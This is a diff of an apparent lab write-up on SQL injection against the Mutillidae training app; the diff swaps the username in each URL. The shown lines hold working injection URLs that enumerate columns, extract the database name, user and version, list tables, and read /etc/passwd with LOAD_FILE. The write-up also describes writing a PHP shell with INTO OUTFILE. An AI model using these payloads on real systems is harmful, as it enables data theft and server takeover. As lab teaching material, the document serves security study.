@@ -77,7 +77,7 @@ Since we do not know the number of columns, we start at 1. To find the exact amo
 
 The browser url of this info page need to be modified with the url as below:
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=sivaram%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
 
 
 ![11](https://github.com/sivaram-R/sqlinjection/assets/121165794/aa1be39c-051d-48ba-8520-8154a4bc5d28)
@@ -104,7 +104,7 @@ As given in the screenshot below columns 2,3,4 are usable in which we can substi
 
  Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=sivaram%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
 
 ![16](https://github.com/sivaram-R/sqlinjection/assets/121165794/790f0c4b-7812-4fb2-b1a4-33223415edd2)
 
@@ -115,7 +115,7 @@ In MySQL, the table “information_schema.tables” contains all the metadata id
 Replace the query in the url with the following one:
 union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=sivaram%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
 ![18](https://github.com/sivaram-R/sqlinjection/assets/121165794/5f6063fc-ac99-4078-a81e-6dca2a71f34b)
 
 ![19](https://github.com/sivaram-R/sqlinjection/assets/121165794/58a4158f-904c-437d-a911-8c5a10853db9)
@@ -156,7 +156,7 @@ We can use the “LOAD_FILE()” operator to peruse the contents of any file con
 
 Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
-http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=sivaram%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
 ![24](https://github.com/sivaram-R/sqlinjection/assets/121165794/eb4e7934-2521-4d82-8ab0-d68991a8fddd)
 ![25](https://github.com/sivaram-R/sqlinjection/assets/121165794/7666fcb7-711c-42a2-ade6-2c73fd728d40)
 the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
